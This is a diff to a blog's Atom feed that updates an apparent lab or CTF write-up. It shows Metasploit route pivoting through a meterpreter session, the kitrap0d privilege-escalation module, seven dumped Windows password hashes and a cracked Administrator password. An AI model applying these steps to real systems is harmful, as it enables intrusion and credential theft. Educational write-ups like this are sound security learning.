@@ -4,7 +4,7 @@
   <title><![CDATA[My portfolio]]></title>
   <link href="http://paulsec.github.io/atom.xml" rel="self"/>
   <link href="http://paulsec.github.io/"/>
-  <updated>2014-05-15T22:18:36+02:00</updated>
+  <updated>2014-05-15T22:36:29+02:00</updated>
   <id>http://paulsec.github.io/</id>
   <author>
     <name><![CDATA[Paul A. (PaulSec)]]></name>
@@ -293,7 +293,9 @@ That&rsquo;s where I found the Terminal Server.</p>
 
 <p>I decided to add some route:</p>
 
-<p><code>route add 127.0.0.1 255.255.255.0 2</code></p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>route add 127.0.0.1 255.255.255.0 2</span></code></pre></td></tr></table></div></figure>
+
 
 <p>I added a route that allowed me target the remote machine with the IP 127.0.0.1.
 The traffic was tunneled through the meterpreter&rsquo;s session. Nice trick, like it.</p>
@@ -315,6 +317,26 @@ However, I remember about an exploit called <a href="http://www.exploit-db.com/e
 Linked it to my Meterpreter&rsquo;s session and &ldquo;Voilà!&rdquo;, I got SYSTEM privileges. :&ndash;)</p>
 
 <p>The metasploit module is: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_015_kitrap0d.rb"><em>exploit/windows/local/ms10_015_kitrap0d</em></a>.</p>
+
+<p>Then, I was able to dump hashes from the system:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Administrator:500:921988ba001dc8e1e1c7c53891cb0efa:e1270db1dd8bf1e32725729695aa1feb:::
+</span><span class='line'>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class='line'>HelpAssistant:1000:887f24b0020b273cb90fe7c65f15ca55:c9ee87d435cfd6b9b824e7476e87ee23:::
+</span><span class='line'>SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:904376a878474e83e38973eb591a30bf:::
+</span><span class='line'>bob:1003:66e5d5ae82299cb6aad3b435b51404ee:42865c72994c34e54d4c5d659fc15b10:::
+</span><span class='line'>IUSR_BOBBY:1004:cd15c852291896b9bcb0b504caf52a34:290a598ad6db348292cd06eeda96a626:::
+</span><span class='line'>IWAM_BOBBY:1005:2b726cbf313f69b4617d49f3866beaad:1dddcc00ab4bcbe9e21b767f8a9a4d9e:::</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And then, I cracked the passwords (for fun) using John The Ripper and Administrator&rsquo;s password was: <em>P@SSW0RD12345</em>.</p>
 
 <p>I hope you liked the write-up which contains (in my opinion) funny tricks by adding some route, doing port forwarding, etc.
 Cheers and see you soon!</p>
